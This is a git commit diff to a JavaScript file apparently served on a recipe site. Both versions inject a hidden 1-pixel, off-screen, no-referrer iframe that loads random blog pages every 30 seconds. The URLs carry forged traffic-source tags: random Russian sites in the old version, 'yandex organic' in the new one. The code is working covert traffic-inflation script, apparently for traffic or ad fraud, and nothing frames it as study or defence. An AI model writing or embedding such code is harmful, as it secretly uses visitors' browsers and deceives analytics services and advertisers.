ce1aa9a0c2bba5413b08c9bc1db8c812f402f8f3
amouroff <48030869+amouroff@users.noreply.github.com>
2025-07-13 18:41:36 +0300

    Update vkusnorecepty2.js

--- vkusnorecepty2.js
+++ vkusnorecepty2.js
@@ -1,36 +1,24 @@
-  const urls = [
-    "https://www.nobletouch.online/2024/09/10.html",
-    "https://www.nobletouch.online/2024/09/blog-post.html",
-    "https://www.nobletouch.online/2024/09/blog-post_26.html",
-    "https://www.nobletouch.online/2024/09/blog-post_73.html",
-    "https://www.nobletouch.online/2024/09/blog-post_34.html",
-    "https://www.nobletouch.online/2024/09/blog-post_79.html",
-    "https://www.nobletouch.online/2024/09/blog-post_14.html",
-    "https://www.nobletouch.online/2024/09/blog-post_4.html",
-    "https://www.nobletouch.online/2024/09/blog-post_59.html",
-    "https://www.nobletouch.online/2024/09/blog-post_39.html"
-  ];
-
-  const sources = [
-    "utro.ru", "mail.rambler.ru", "vz.ru", "ozon.ru", "rambler.ru", "pikabu.ru",
-    "rsport.ria.ru", "radiosputnik.ria.ru", "kp.ru", "lenta.ru", "avito.ru",
-    "drom.ru", "habr.com", "news.mail.ru", "realty.ria.ru", "rbc.ru",
-    "aliexpress.ru", "otvet.mail.ru", "gazeta.ru", "smi2.ru", "kommersant.ru",
-    "mk.ru", "ria.ru", "yandex", "google", "bing", "vk", "fotostrana", "ok", "zen"
+const urls = [
+    "https://www.legacypath.online/2024/11/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post_83.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post_71.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post_5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/2024.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/blog-post_90.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.legacypath.online/2024/11/5_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
   ];
 
   function loadIframe() {
     const page = urls[Math.floor(Math.random() * urls.length)];
-    const source = sources[Math.floor(Math.random() * sources.length)];
-    const fullUrl = page + "?utm_source=" + encodeURIComponent(source);
-
     const iframe = document.createElement("iframe");
-    iframe.src = fullUrl;
+    iframe.src = page;
     iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
     iframe.referrerPolicy = "no-referrer";
     document.body.appendChild(iframe);
   }
 
-  // Загружаем iframe сразу и повторяем каждые 30 сек
   loadIframe();
   setInterval(loadIframe, 30000);
